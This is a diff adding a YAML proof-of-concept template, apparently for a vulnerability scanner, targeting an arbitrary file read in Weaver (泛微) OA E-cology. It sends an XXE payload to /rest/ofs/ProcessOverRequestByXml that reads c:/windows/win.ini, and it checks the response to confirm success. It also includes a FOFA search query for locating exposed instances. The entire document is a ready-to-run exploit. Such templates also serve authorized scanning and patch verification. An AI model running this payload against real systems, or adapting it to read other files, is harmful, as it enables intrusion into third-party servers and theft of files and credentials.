@@ -1,0 +1,19 @@
+id: poc-yaml-weaver-cology9-processoverrequestbyxml-anyfile-read
+info:
+  name: 泛微OA E-cology ProcessOverRequestByXml 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: e-cology
+  fofa: body="/js/ecology8"
+requests:
+- method: POST
+  path: /rest/ofs/ProcessOverRequestByXml
+  headers:
+    Content-Type: application/xml
+  data: <?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM
+    "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"[fonts]")
+    && contains(body,"<ResultInfo>") && contains(content_type,"application/xml")
+variables: {}
+transport: http
